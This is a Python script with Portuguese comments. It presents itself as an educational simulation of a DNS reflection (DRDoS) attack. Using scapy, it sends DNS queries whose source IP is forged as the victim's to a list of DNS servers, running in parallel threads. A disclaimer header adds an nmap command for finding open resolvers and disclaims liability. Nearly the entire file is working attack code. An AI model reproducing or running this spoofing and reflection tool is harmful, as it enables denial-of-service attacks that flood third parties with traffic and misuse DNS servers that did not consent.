'''
###################################################### DISCLAIMER #######################################################
|  Comando para identificar se seu servidor esta vulneravel:                                                            |
|  nmap -sU -p 53 --script=dns-recursion,dns-brute --script-args "dns-brute.threads=10,dns-recursion.qtype=ANY" <target>|
|  Simulação educacional de DRDoS usando servidores DNS.                                                                |
|  Para mais informações sobre ataques de amplificação DNS, consulte:                                                   |
|  https://www.us-cert.gov/ncas/alerts/TA13-088A                                                                        |
|  I am NOT responsible for any damages caused or any crimes committed by using this tool.                              |
#########################################################################################################################
'''

from scapy.all import IP, UDP, DNS, DNSQR, send
from concurrent.futures import ThreadPoolExecutor

def simulate_dns_dr_dos(target_ip, dns_server, domain="example.com", num_packets=10):
    """
    Simula um ataque DRDoS DNS para fins educativos.
    :param target_ip: IP da vítima que receberá os pacotes amplificados.
    :param dns_server: Servidor DNS vulnerável para enviar as solicitações.
    :param domain: Nome de domínio para a consulta DNS amplificada.
    :param num_packets: Número de pacotes a serem enviados.
    """
    for i in range(num_packets):
        # Construindo o pacote DNS com IP falso (do alvo)
        packet = (
            IP(src=target_ip, dst=dns_server) /
            UDP(sport=12345, dport=53) /  # Porta de origem aleatória, destino 53 (DNS)
            DNS(rd=1, qd=DNSQR(qname=domain, qtype="A"))
        )
        print(f"[{i+1}/{num_packets}] Enviando pacote para {dns_server} como se fosse de {target_ip}...")
        send(packet, verbose=0)

def simulate_dns_dr_dos_multiple(target_ip, dns_servers, domain="example.com", num_packets_per_server=10, num_threads=4):
    """
    Simula um ataque DRDoS DNS contra múltiplos servidores simultaneamente.
    :param target_ip: IP da vítima que receberá os pacotes amplificados.
    :param dns_servers: Lista de servidores DNS vulneráveis para enviar as solicitações.
    :param domain: Nome de domínio para a consulta DNS amplificada.
    :param num_packets_per_server: Número de pacotes a serem enviados por servidor.
    :param num_threads: Número de threads a serem usadas para execução paralela.
    """
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [
            executor.submit(simulate_dns_dr_dos, target_ip, dns_server, domain, num_packets_per_server)
            for dns_server in dns_servers
        ]
        # Espera todas as threads finalizarem
        for future in futures:
            future.result()

if __name__ == "__main__":
    # Substitua pelos valores que deseja usar para simulação
    TARGET_IP = "192.168.1.1"   # IP da "vítima" (falsificado)
    DNS_SERVERS = ["192.168.1.2","192.168.1.3","192.168.1.4"]  # Lista de servidores DNS vulneráveis
    DOMAIN = "google.com"  # Domínio usado na consulta amplificada
    NUM_PACKETS_PER_SERVER = 1  # Número de pacotes a enviar por servidor
    NUM_THREADS = 10  # Número de threads para paralelismo

    print("Simulando ataque DRDoS DNS...")
    simulate_dns_dr_dos_multiple(TARGET_IP, DNS_SERVERS, DOMAIN, NUM_PACKETS_PER_SERVER, NUM_THREADS)
    print("Simulação concluída.")
